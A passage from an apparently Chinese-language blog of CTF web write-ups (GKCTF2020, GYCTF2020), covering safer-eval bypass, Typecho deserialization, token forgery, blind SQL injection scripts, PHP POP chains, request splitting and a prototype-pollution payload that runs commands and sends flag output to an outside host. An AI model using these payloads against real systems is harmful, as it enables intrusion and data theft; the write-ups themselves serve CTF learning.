class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>就可以直接 eval 了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/eval&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title class_">String</span>(response));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p>
<blockquote>
<p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p>
</blockquote>
<p>后面就是绕 saferEval 了，这个根据版本去搜一下就好 ，最新版本的一般在 github 的 issues 里找到，可以直接拿来用</p>
<p><a href="https://github.com/commenthol/safer-eval/issues/11">https://github.com/commenthol/safer-eval/issues/11</a></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528120421.png" alt="image-20200528120418230"></p>
<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p><strong>反序列化</strong></p>
<p><a href="https://www.kingkk.com/2018/07/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Typecho反序列化漏洞复现</a></p>
<p>原版本在 install.php 那会有一个反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121417.png" alt="image-20200528121416697"></p>
<p>但是出题人在这里加多了一个 <code>if(!isset($_SESSION))</code></p>
<p>但是后面还有一处，我们直接传入 <code>?start</code> 触发即可</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121358.png" alt="image-20200528121355676"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121956.png" alt="image-20200528121820549"></p>
<p>命令执行无限制，直接读 &#x2F;flag 就好</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528122002.png" alt="image-20200528121954615"></p>
<h2 id="GKCTF2020-Node-Exe"><a href="#GKCTF2020-Node-Exe" class="headerlink" title="[GKCTF2020]Node-Exe"></a>[GKCTF2020]Node-Exe</h2><p>第一次碰到这题目，无从下手，不过还挺有意思的</p>
<p>先看一下程序运行逻辑，打开 admin 登陆进去，然后给你三个 flag，打开 fiddler 抓包发现是发送了一个含有 timestamp 的 json，id 对应的就是 flag 的位置</p>
<blockquote>
<p>命令行断点 bpu <a href="http://xxx.node3.buuoj.cn/">http://xxx.node3.buuoj.cn</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000&#125;</span><br></pre></td></tr></table></figure>

<p>直接修改 id &#x3D; 3 会返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;HaHa Hacker!!!&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>写脚本伪造 timestamp 也失败</p>
<p>所以后台应该是验证了 token</p>
<p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/app-64/resources/app.asar</span><br></pre></td></tr></table></figure>

<p>进行反编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g asar</span><br><span class="line">asar extract app.asar app</span><br></pre></td></tr></table></figure>

<p>看一下 buyflag 的逻辑</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">buyFlag</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">c</span>()(a.<span class="property">a</span>.<span class="title function_">mark</span>((<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> o;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="property">a</span>.<span class="title function_">wrap</span>((<span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.<span class="property">prev</span> = t.<span class="property">next</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> o = &#123;</span><br><span class="line">                    <span class="attr">id</span>: e,</span><br><span class="line">                    <span class="attr">timestamp</span>: <span class="title class_">Date</span>.<span class="title function_">parse</span>(<span class="keyword">new</span> <span class="title class_">Date</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                t.<span class="property">t0</span> = i.<span class="property">$http</span>,</span><br><span class="line">                t.<span class="property">t1</span> = i.<span class="property">url</span> + <span class="string">&quot;/buyflag&quot;</span>,</span><br><span class="line">                t.<span class="property">t2</span> = o,</span><br><span class="line">                t.<span class="property">next</span> = <span class="number">6</span>,</span><br><span class="line">                i.<span class="title function_">makeToken</span>(o);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                t.<span class="property">t3</span> = t.<span class="property">sent</span>,</span><br><span class="line">                t.<span class="property">t4</span> = &#123;</span><br><span class="line">                    <span class="attr">token</span>: t.<span class="property">t3</span></span><br><span class="line">                &#125;,</span><br><span class="line">                t.<span class="property">t5</span> = &#123;</span><br><span class="line">                    <span class="attr">headers</span>: t.<span class="property">t4</span></span><br><span class="line">                &#125;,</span><br><span class="line">                t.<span class="property">t6</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    i.<span class="property">$Modal</span>.<span class="title function_">info</span>(&#123;</span><br><span class="line">                        <span class="attr">title</span>: <span class="string">&quot;购买结果&quot;</span>,</span><br><span class="line">                        <span class="attr">content</span>: e.<span class="property">data</span>[<span class="number">0</span>].<span class="property">flag</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;,</span><br><span class="line">                t.<span class="property">t0</span>.<span class="property">post</span>.<span class="title function_">call</span>(t.<span class="property">t0</span>, t.<span class="property">t1</span>, t.<span class="property">t2</span>, t.<span class="property">t5</span>).<span class="title function_">then</span>(t.<span class="property">t6</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;end&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> t.<span class="title function_">stop</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下 makeToken</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">makeToken</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">c</span>()(a.<span class="property">a</span>.<span class="title function_">mark</span>((<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> o, r;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="property">a</span>.<span class="title function_">wrap</span>((<span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.<span class="property">prev</span> = t.<span class="property">next</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;31169fedc9a20ecf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;d96adeefaa0102a9&quot;</span>,</span><br><span class="line">                o = <span class="title function_">f</span>()(<span class="title function_">n</span>()(e)),</span><br><span class="line">                t.<span class="property">next</span> = <span class="number">5</span>,</span><br><span class="line">                i.<span class="title function_">encrypt</span>(<span class="string">&quot;31169fedc9a20ecf&quot;</span>, <span class="string">&quot;d96adeefaa0102a9&quot;</span>, o);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">return</span> r = t.<span class="property">sent</span>,</span><br><span class="line">                t.<span class="title function_">abrupt</span>(<span class="string">&quot;return&quot;</span>, r);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;end&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> t.<span class="title function_">stop</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看一下 encrypt</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, i, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">c</span>()(a.<span class="property">a</span>.<span class="title function_">mark</span>((<span class="keyword">function</span> <span class="title function_">n</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="property">a</span>.<span class="title function_">wrap</span>((<span class="keyword">function</span>(<span class="params">o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (o.<span class="property">prev</span> = o.<span class="property">next</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> o.<span class="title function_">abrupt</span>(<span class="string">&quot;return&quot;</span>, <span class="keyword">new</span> s.<span class="title function_">a</span>((<span class="keyword">function</span>(<span class="params">o</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> n = p.<span class="property">a</span>.<span class="title function_">createCipheriv</span>(<span class="string">&quot;aes-128-cbc&quot;</span>, e, i),</span><br><span class="line">                    r = n.<span class="title function_">update</span>(t, <span class="string">&quot;utf8&quot;</span>, <span class="string">&quot;binary&quot;</span>);</span><br><span class="line">                    r += n.<span class="title function_">final</span>(<span class="string">&quot;binary&quot;</span>),</span><br><span class="line">                    <span class="title function_">o</span>(r = <span class="keyword">new</span> <span class="title class_">Buffer</span>.<span class="title function_">from</span>(r, <span class="string">&quot;binary&quot;</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">                &#125;)));</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;end&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> o.<span class="title function_">stop</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), n, o)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p>
<p>随便拿一个 token 试验一下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p>
<p>32 位的我们拿 md5 测试一下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p>
<p>可以看到是吻合的，这里贴上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> time, json, datetime, hashlib</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">raw</span>):</span><br><span class="line">    BS = <span class="number">16</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS) </span><br><span class="line">    key = <span class="string">b&#x27;31169fedc9a20ecf&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;d96adeefaa0102a9&#x27;</span></span><br><span class="line">    raw = pad(raw).encode()</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = cryptor.encrypt(raw)</span><br><span class="line">    <span class="keyword">return</span> b2a_hex(ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data_token</span>():</span><br><span class="line">    dtime = datetime.datetime.now()</span><br><span class="line">    t = <span class="built_in">int</span>(time.mktime(dtime.timetuple())) * <span class="number">1000</span></span><br><span class="line">    data = json.dumps(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3||1&quot;</span>, <span class="string">&quot;timestamp&quot;</span>:t&#125;).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] data：%s&quot;</span> % data)</span><br><span class="line">    token = encrypt(hashlib.md5(data.encode()).hexdigest())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] token：%s&quot;</span> % token)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:token</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data, headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;</span></span><br><span class="line">    data, headers = get_data_token()</span><br><span class="line">    res = rq.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p>
<blockquote>
<p>需要注意的是</p>
<ol>
<li>使用 json.dumps 要把结果的空格都去掉</li>
<li>AES 加密使用的 padding 是 pkcs5</li>
<li>时间戳的获取一定要用 datetime()，不能用直接 time.time()</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 GYCTF Web</title>
    <url>/2020/02/29/2020-GYCTF-Web/</url>
    <content><![CDATA[<blockquote>
<p>学习到了一点新知识</p>
</blockquote>
<span id="more"></span>

<h2 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h2><p>本题漏洞比较明显，PDO 支持堆叠注入，然后用十六进制绕过 check。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4efaa4d7badc406b9b50ecab0c36eaeb13b1c0c4b1b14e55.changame.ichunqiu.com/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">chset = string.printable</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbname = pdotest</span></span><br><span class="line"><span class="comment"># tbname = table1</span></span><br><span class="line"><span class="comment"># clname = balabala,eihey,fllllll4g,bbb</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">	l = <span class="number">0</span></span><br><span class="line">	r = <span class="number">127</span></span><br><span class="line">	m = (l+r)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> l&lt;r:</span><br><span class="line">		<span class="comment"># print(&quot;[*] try: &#123;&#125;&quot;.format(chr(m)))</span></span><br><span class="line">		payload = <span class="string">&quot;select if(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)&quot;</span>.<span class="built_in">format</span>(index,m)</span><br><span class="line">		payload = binascii.b2a_hex(payload.encode()).decode()</span><br><span class="line">		payload = <span class="string">&quot;1&quot;</span>+urllib.parse.unquote(<span class="string">&quot;%df&quot;</span>)+<span class="string">&quot;&#x27;;set @a=0x&#123;&#125;;prepare cmd from @a;execute cmd;&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line"></span><br><span class="line">		paramsGet = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			res = session.get(url, params=paramsGet, timeout=<span class="number">2</span>)</span><br><span class="line">			r = m</span><br><span class="line">			m = (l+r)//<span class="number">2</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			l = m + <span class="number">1</span></span><br><span class="line">			m = (l+r)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">	flag += <span class="built_in">chr</span>(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h2><p>改自 2019 qwb 随便注，过滤了 set、prepare 等，随便搜搜发现是 2019 fudanctf 原题</p>
<p><a href="https://www.4hou.com/posts/mM60">https://www.4hou.com/posts/mM60</a></p>
<p>采用的是 mysql handler 的新特性 handler</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/8.0/en/handler.html</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 获取表名</span><br><span class="line">;show tables;#</span><br><span class="line">2. 读表</span><br><span class="line">&#x27;;handler FlagHere open; handler FlagHere read first;</span><br></pre></td></tr></table></figure>



<h2 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h2><p>考察 toUpperCase() 漏洞和原型链污染，这个原型链污染十分的明显，直接看到未定义变量 outputFunctionName，看到了 merge 函数的触发点</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 注册账号</span><br><span class="line">admın:123</span><br><span class="line">2. 原型污染 application/json</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;test\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&#x27;child_process&#x27;).execSync(&#x27;ping http://xxxxx/$(cat /flag)&#x27;);var req = require(&#x27;http&#x27;).request(`http://*.*.*.*/?$&#123;result&#125;`);req.end();\n//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>这个看了官方 payload 表示无法理解，当时直接随便穿个马就 getshell …大概是过滤没写好吧</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>反序列化 + piapiapia 原题</p>
<p>pop 链比较明显，<code>UpdateHelper</code> 的 <code>__destruct()</code> &#x3D;&gt; <code>User</code> 的 <code>__toString()</code> &#x3D;&gt;<code>Info</code>的<code>__call()</code>，即可任意执行 sql 语句，然后根据下面的 safe 函数溢出 payload 构成新的序列化语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>参考了月亮大哥的 payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;select id,password from user where username=?&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>; </span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">dbCtrl</span>();</span><br><span class="line"><span class="variable">$i</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$i</span>-&gt;CtrlCase = <span class="variable">$o</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u</span>-&gt;nickname = <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;sql = <span class="variable">$u</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;CtrlCase = <span class="variable">$h</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="number">47</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$dd</span>=<span class="number">0</span>;<span class="variable">$dd</span>&lt;<span class="variable">$len</span>;<span class="variable">$dd</span>++)&#123;</span><br><span class="line">    <span class="variable">$res</span>.=<span class="string">&quot;union&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>.=<span class="variable">$s</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST:</span></span><br><span class="line"><span class="comment">// age=&amp;nickname=上面</span></span><br></pre></td></tr></table></figure>



<h2 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h2><p>这道题当时没完成，结束后才发现当时搭环境没有搭完整…</p>
<p>也是参考了 Nullcon HackIM 2020 - split second 原题，但是过滤难度下降了，payload 可以直接拿来用</p>
<p>赛后就在本地复现了上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------20539204871043521200876952878</span></span><br><span class="line"><span class="string">Content-Length: 222</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------20539204871043521200876952878</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;kk.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------20539204871043521200876952878--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x: &#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0xff&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"></span><br><span class="line">proxy = &#123; <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span> &#125;</span><br><span class="line">requests.get(<span class="string">&quot;http://127.0.0.1:8081/core&quot;</span>, params=&#123;<span class="string">&#x27;q&#x27;</span>:payload&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把 Nullcon HackIM 2020 - split second的 wp 直接拿过来过一下请求包就可以了</p>
<p><a href="https://blog.rwx.kr/nullcon-hackim-2020-split-second/">https://blog.rwx.kr/nullcon-hackim-2020-split-second/</a></p>
<p>最后上传以下代码就可以执行命令了</p>
